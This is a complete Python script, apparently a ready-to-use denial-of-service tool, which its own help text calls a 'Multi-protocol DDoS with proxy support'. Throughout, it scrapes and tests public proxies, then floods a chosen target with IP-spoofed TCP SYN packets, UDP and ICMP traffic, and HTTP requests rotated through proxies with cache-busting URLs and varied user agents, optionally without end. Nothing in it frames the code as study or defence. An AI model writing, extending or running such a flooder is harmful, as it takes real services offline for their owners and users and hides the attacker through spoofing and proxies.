#!/usr/bin/env python3
import socket
import struct
import random
import time
import threading
import sys
import argparse
import math
import requests
from bs4 import BeautifulSoup
import socks
import urllib.parse

# --- Proxy scraper ---
PROXY_SOURCES = [
    "https://www.sslproxies.org/",
    "https://free-proxy-list.net/",
    "https://www.us-proxy.org/",
    "https://www.socks-proxy.net/",
    "https://spys.me/proxy.txt",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all"
]

def scrape_proxies():
    proxies = set()
    for url in PROXY_SOURCES:
        try:
            resp = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
            if url.endswith('.txt'):
                for line in resp.text.splitlines():
                    line = line.strip()
                    if ':' in line and not line.startswith('#'):
                        proxies.add(line)
            else:
                soup = BeautifulSoup(resp.text, 'html.parser')
                # Common table with IP and port
                table = soup.find('table')
                if table:
                    rows = table.find_all('tr')
                    for row in rows[1:]:
                        cols = row.find_all('td')
                        if len(cols) >= 2:
                            ip = cols[0].text.strip()
                            port = cols[1].text.strip()
                            if ip and port:
                                proxies.add(f"{ip}:{port}")
                else:
                    # Try to find IP:port patterns
                    import re
                    pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}:\d{2,5}\b'
                    for match in re.findall(pattern, resp.text):
                        proxies.add(match)
        except:
            continue
    return list(proxies)

def test_proxy(proxy, timeout=5):
    try:
        parts = proxy.split(':')
        if len(parts) != 2:
            return False
        ip, port = parts
        # Simple HTTP test
        test_url = "http://httpbin.org/ip"
        proxies_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        r = requests.get(test_url, proxies=proxies_dict, timeout=timeout)
        return r.status_code == 200
    except:
        return False

def get_working_proxies(limit=100):
    all_proxies = scrape_proxies()
    working = []
    for proxy in all_proxies:
        if len(working) >= limit:
            break
        if test_proxy(proxy):
            working.append(proxy)
    return working

# --- Raw flood functions (IP spoofing) ---
def checksum(data):
    if len(data) % 2 != 0:
        data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(data)//2), data))
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF

def random_ip():
    return socket.inet_ntoa(struct.pack('!I', random.randint(1, 0xFFFFFFFE)))

def random_port():
    return random.randint(1024, 65535)

def syn_flood(target_ip, target_port, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except:
        return
    source_ip = random_ip()
    while not stop_event.is_set():
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 40
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(source_ip)
        ip_daddr = socket.inet_aton(target_ip)
        ip_header = struct.pack('!BBHHHBBH4s4s',
                                (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len,
                                ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check,
                                ip_saddr, ip_daddr)
        tcp_source = random_port()
        tcp_seq = random.randint(0, 0xFFFFFFFF)
        tcp_ack_seq = 0
        tcp_doff = 5
        tcp_flags = 0x02
        tcp_window = socket.htons(65535)
        tcp_check = 0
        tcp_urg_ptr = 0
        tcp_header = struct.pack('!HHLLBBHHH',
                                 tcp_source, target_port, tcp_seq, tcp_ack_seq,
                                 (tcp_doff << 4) + 0, tcp_flags,
                                 tcp_window, tcp_check, tcp_urg_ptr)
        src_addr = socket.inet_aton(source_ip)
        dst_addr = socket.inet_aton(target_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        psh = struct.pack('!4s4sBBH', src_addr, dst_addr, placeholder, protocol, tcp_length)
        psh += tcp_header
        tcp_check = checksum(psh)
        tcp_header = struct.pack('!HHLLBBHHH',
                                 tcp_source, target_port, tcp_seq, tcp_ack_seq,
                                 (tcp_doff << 4) + 0, tcp_flags,
                                 tcp_window, tcp_check, tcp_urg_ptr)
        packet = ip_header + tcp_header
        try:
            sock.sendto(packet, (target_ip, 0))
        except:
            pass
        source_ip = random_ip()

def udp_flood(target_ip, target_port, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except:
        return
    payload = b'X' * 1024
    while not stop_event.is_set():
        try:
            sock.sendto(payload, (target_ip, target_port))
        except:
            pass
        if target_port == 0:
            target_port = random_port()

def icmp_flood(target_ip, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except:
        return
    while not stop_event.is_set():
        icmp_type = 8
        icmp_code = 0
        icmp_checksum = 0
        icmp_identifier = random.randint(0, 65535)
        icmp_sequence = random.randint(0, 65535)
        payload = random._urandom(1024)
        icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum,
                                  icmp_identifier, icmp_sequence)
        icmp_checksum = checksum(icmp_header + payload)
        icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum,
                                  icmp_identifier, icmp_sequence)
        packet = icmp_header + payload
        try:
            sock.sendto(packet, (target_ip, 0))
        except:
            pass

# --- HTTP flood using proxies ---
def http_flood(target_url, proxy_list, stop_event, thread_id):
    session = requests.Session()
    while not stop_event.is_set():
        if proxy_list:
            proxy = random.choice(proxy_list)
            proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            session.proxies.update(proxies)
        try:
            # random path to bypass cache
            url = target_url + '?' + str(random.randint(0, 999999))
            session.get(url, timeout=5, headers={'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
                'Mozilla/5.0 (X11; Linux x86_64)'
            ])})
        except:
            pass

# --- Main ---
def main():
    parser = argparse.ArgumentParser(description='Multi-protocol DDoS with proxy support')
    parser.add_argument('target', help='Target IP or domain (for HTTP use full URL)')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port')
    parser.add_argument('--protocol', choices=['tcp', 'udp', 'icmp', 'http', 'all'], default='all',
                        help='Protocol to flood')
    parser.add_argument('-t', '--threads', type=int, default=100, help='Number of threads per attack')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Duration in seconds (0 = infinite)')
    parser.add_argument('--proxies', action='store_true', help='Auto-scrape and use proxies (for HTTP)')
    parser.add_argument('--proxy-limit', type=int, default=100, help='Max number of proxies to use')
    args = parser.parse_args()

    # Resolve domain to IP if needed for raw attacks
    target_ip = args.target
    if args.protocol in ['tcp','udp','icmp','all'] and not target_ip.replace('.','').isdigit():
        try:
            target_ip = socket.gethostbyname(target_ip)
        except:
            print("[-] Cannot resolve domain", file=sys.stderr)
            sys.exit(1)

    stop_event = threading.Event()
    threads = []

    # Proxy scraping
    proxy_list = []
    if args.proxies and args.protocol in ['http','all']:
        print("[*] Scraping proxies...", file=sys.stderr)
        proxy_list = get_working_proxies(args.proxy_limit)
        print(f"[*] Got {len(proxy_list)} working proxies", file=sys.stderr)

    def start_protocol(protocol, target, port, threads_count, stop_event, proxy_list):
        if protocol == 'tcp':
            for i in range(threads_count):
                t = threading.Thread(target=syn_flood, args=(target, port, stop_event))
                t.daemon = True
                t.start()
                threads.append(t)
        elif protocol == 'udp':
            for i in range(threads_count):
                t = threading.Thread(target=udp_flood, args=(target, port, stop_event))
                t.daemon = True
                t.start()
                threads.append(t)
        elif protocol == 'icmp':
            for i in range(threads_count):
                t = threading.Thread(target=icmp_flood, args=(target, stop_event))
                t.daemon = True
                t.start()
                threads.append(t)
        elif protocol == 'http':
            for i in range(threads_count):
                t = threading.Thread(target=http_flood, args=(target, proxy_list, stop_event, i))
                t.daemon = True
                t.start()
                threads.append(t)

    if args.protocol == 'all':
        start_protocol('tcp', target_ip, args.port, args.threads, stop_event, [])
        start_protocol('udp', target_ip, args.port, args.threads, stop_event, [])
        start_protocol('icmp', target_ip, 0, args.threads, stop_event, [])
        if args.proxies and proxy_list:
            # Also launch HTTP flood with proxies
            target_url = args.target if '://' in args.target else f"http://{args.target}:{args.port}"
            start_protocol('http', target_url, 0, args.threads//2, stop_event, proxy_list)
    else:
        if args.protocol == 'http':
            target_url = args.target if '://' in args.target else f"http://{args.target}:{args.port}"
            start_protocol('http', target_url, 0, args.threads, stop_event, proxy_list)
        else:
            start_protocol(args.protocol, target_ip, args.port, args.threads, stop_event, [])

    print(f"[*] Attack started on {args.target} with {args.protocol} threads: {args.threads}", file=sys.stderr)
    try:
        if args.duration > 0:
            time.sleep(args.duration)
            stop_event.set()
        else:
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        stop_event.set()
    finally:
        for t in threads:
            t.join(timeout=1)
        print("[*] Stopped.", file=sys.stderr)

if __name__ == '__main__':
    main()
